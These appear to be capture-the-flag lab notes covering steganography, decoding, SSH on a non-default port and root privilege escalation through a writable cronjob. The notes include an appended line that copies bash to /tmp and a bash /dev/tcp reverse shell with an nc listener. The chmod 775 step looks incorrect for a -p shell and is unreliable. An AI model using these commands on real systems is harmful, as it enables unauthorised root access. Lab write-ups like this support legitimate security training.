-  if there are images check for hidden information in them (steganography), or metadata with `exiftool`
-  `steghide --info [image.jpg]` and `steghide extract -sf [image.jpg]` (passphrase required) for steganography stuff.
-  remember to check the source code of the page.
- `base62` decoding
- `md5` hashing value - the second flag is set as UserAgent in `robots.txt`
-  `linpeas.sh` for privilege escalation info
-  used `ssh -p 6498 boring@machine_ip`, because the machine was not using the default ssh port (22)
-  had to deal with a cute `ROT13` algorithm
-  https://juggernaut-sec.com/cron-jobs-lpe/ - interesting cron job exploitation methods. 
-  for the privesc part: there is a cronjob running as root every minute called `.mysecretcronjob.sh` located in `/var/www/`, but `.mysecretcronjob` could be modified by the user `boring` , so the line `cp /bin/bash /tmp && chmod 775 /tmp/bash` could be appended, so every minute this bash could be executed by everyone with the `-p` flag.
![[bash p flag.png]]
-  you can also set up a reverse shell with bash by adding: `bash -i &> /dev/tcp/10.21.55.48/4444` to the cronjob and setting up a listener with `nc -nlvp 4444` on another terminal
 ![[reverse_shell_easy_peasy.png]]